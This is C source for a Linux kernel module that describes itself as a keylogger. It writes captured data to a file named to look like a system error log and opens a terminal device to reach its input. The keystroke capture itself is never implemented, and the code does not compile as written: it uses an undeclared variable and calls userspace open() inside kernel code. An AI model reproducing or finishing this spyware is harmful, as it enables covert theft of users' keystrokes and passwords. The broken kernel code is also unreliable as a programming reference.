#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/tty.h>

#define DRIVER_AUTHOR "Arun Narasimhan <wormfox@foxmail.com>"
#define DRIVER_DESC   "A keylogger device driver"
#define DRIVER_LICENSE "GPL"
#define KeyLoggerFile "/var/log/syserr.log"

//change kernel pointer chack
#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs);}

/* Macros used to write to logfile */
#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
#define WRITABLE(f) (f->f_op && f->f_op->write)

typedef enum
{
    VK_DISABLE = -1,
    VK_NORMAL = 0,
    VK_DUMBMODE = 1,
    VK_SMARTMODE = 1,
} vlogger_mode_t;

int write_to_logfile(char *logfilename,char *buff,int size)
{
    int ret = 0;
    struct file *fp = NULL;
    BEGIN_KMEM;
    fp = filp_open(logfilename,O_CREAT | O_APPEND,00600);
    if(IS_ERR(fp))
    {
        printk(KERN_INFO"Error %ld opening %s \n",-PTR_ERR(fp),logfilename);
        return -1;
    }
    else
    {
        if(WRITABLE(fp))
            _write(fp,buff,size);
        else
        {
            printk(KERN_INFO"%s does not have a writ method! \n",logfilename);
            return -1;
        }
    }
    if((ret = filp_close(fp,NULL)))
        printk(KERN_INFO"Error %d closing %s! \n",ret,logfilename);
    END_KMEM;
    return ret;

}

struct tty_driver *tty_drivers;
static int init_keylogger(void)
{
    printk(KERN_INFO "Registering the keylogger module \n");
    struct tty_driver *p;
    struct tty_struct *tty;
    struct file *file;
    char *devname = "/dev/tty1";
    int fd;

    BEGIN_KMEM;
    fp = open(devname,O_RDONLY,0);
    if(fd < 0)
        return -1;
    file = fget(fd);
    tty = file->private_data;
    return 0;

}

static void exit_keylogger(void)
{
    printk(KERN_INFO "Unregistered the keylogger module \n");
    
}

module_init(init_keylogger);
module_exit(exit_keylogger);
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_SUPPORTED_DEVICE("Not machine dependent");

